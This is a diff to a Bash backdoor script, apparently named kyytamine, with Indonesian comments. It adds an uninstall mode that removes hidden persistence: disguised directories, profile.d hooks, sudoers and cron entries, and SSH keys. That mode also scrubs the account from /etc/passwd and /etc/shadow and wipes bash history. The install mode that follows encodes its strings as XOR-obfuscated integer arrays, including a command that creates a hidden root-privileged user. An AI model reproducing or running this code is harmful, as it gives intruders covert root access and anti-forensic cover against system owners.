@@ -15,6 +15,84 @@ _sys_decode() {
 
 _SYS_KEY=95
 
+# === UNDO MODE ===
+if [[ "$KYY_UNDO" == "1" ]]; then
+    echo "[*] Menjalankan: uninstall_kyytamine.sh"
+    echo "------------------------------------------------------------"
+    echo "--> Mencari dan menghapus semua jejak kyytamine..."
+
+    pkill -f "kyytamine" 2>/dev/null
+    pkill -u kyytamine 2>/dev/null
+    killall -u kyytamine 2>/dev/null
+
+    if id "kyytamine" &>/dev/null; then
+        echo "--> Menghapus user kyytamine..."
+        userdel -r kyytamine 2>/dev/null || userdel kyytamine 2>/dev/null
+        gpasswd -d kyytamine root 2>/dev/null
+        echo "--> User kyytamine berhasil dihapus."
+    else
+        echo "--> WARNING: User kyytamine tidak ditemukan."
+    fi
+
+    HIDE_DIRS=(
+        "/usr/lib/systemd/.config/.kernel/.data/"
+        "/usr/sbin/kyytamine/"
+        "/var/tmp/.cache/kyytamine/"
+        "/usr/share/.systemd-private/kyytamine/"
+        "/dev/shm/.hidden/kyytamine/"
+        "/opt/.backup/kyytamine/"
+        "/var/log/.syslogd/kyytamine/"
+    )
+    for dir in "${HIDE_DIRS[@]}"; do
+        [ -d "$dir" ] && rm -rf "$dir" 2>/dev/null && echo "--> Dihapus: $dir"
+    done
+
+    FILES=(
+        "/etc/profile.d/kyytamine_hook.sh"
+        "/root/.bashrc_kyytamine"
+        "/home/kyytamine/.bashrc"
+        "/etc/sudoers.d/kyytamine"
+        "/etc/cron.d/kyytamine"
+        "/var/spool/cron/crontabs/kyytamine"
+        "/var/spool/cron/kyytamine"
+    )
+    for file in "${FILES[@]}"; do
+        [ -f "$file" ] && rm -f "$file" 2>/dev/null && echo "--> Dihapus: $file"
+    done
+
+    find /tmp -name "*kyytamine*" -type f -exec rm -f {} \; 2>/dev/null
+
+    for file in /etc/passwd /etc/shadow /etc/group /etc/gshadow; do
+        grep -q "kyytamine" "$file" 2>/dev/null && sed -i '/kyytamine/d' "$file" && echo "--> Bersih: $file"
+    done
+
+    grep -q "kyytamine" /etc/sudoers 2>/dev/null && sed -i '/kyytamine/d' /etc/sudoers
+
+    for user_home in /home/* /root; do
+        [ -f "$user_home/.ssh/authorized_keys" ] && sed -i '/kyytamine/d' "$user_home/.ssh/authorized_keys" 2>/dev/null
+        [ -f "$user_home/.bash_history" ] && sed -i '/kyytamine/d' "$user_home/.bash_history" 2>/dev/null
+    done
+
+    history -c 2>/dev/null
+
+    PIDS=$(pgrep -f "kyytamine" 2>/dev/null)
+    [ -n "$PIDS" ] && kill -9 $PIDS 2>/dev/null
+
+    [ -d "/home/kyytamine" ] && rm -rf /home/kyytamine 2>/dev/null
+
+    echo "------------------------------------------------------------"
+    echo "--> Verifikasi:"
+    id "kyytamine" &>/dev/null && echo "--> [FAILED] User masih ada!" || echo "--> [SUCCESS] User sudah tidak ada."
+    pgrep -f "kyytamine" &>/dev/null && echo "--> [FAILED] Masih ada proses!" || echo "--> [SUCCESS] Tidak ada proses."
+    for file in /etc/passwd /etc/shadow /etc/group; do
+        grep -q "kyytamine" "$file" 2>/dev/null && echo "--> [FAILED] Masih ada entri di $file"
+    done
+    echo "------------------------------------------------------------"
+    echo "[+] Uninstall selesai (SUCCESS)"
+    exit 0
+fi
+
+# === INSTALL MODE ===
 _sys_uname=(52 38 38 43 62 50 54 49 58 )
 _sys_upass=(20 38 38 43 62 50 54 49 26 31 103 103 3 123 3 123 )
 _sys_uadd=(42 44 58 45 62 59 59 127 114 48 127 114 42 127 111 127 114 56 127 111 127 114 18 127 114 59 127 112 45 48 48 43 127 114 44 127 112 61 54 49 112 61 62 44 55 127 52 38 38 43 62 50 54 49 58 127 109 97 112 59 58 41 112 49 42 51 51 )
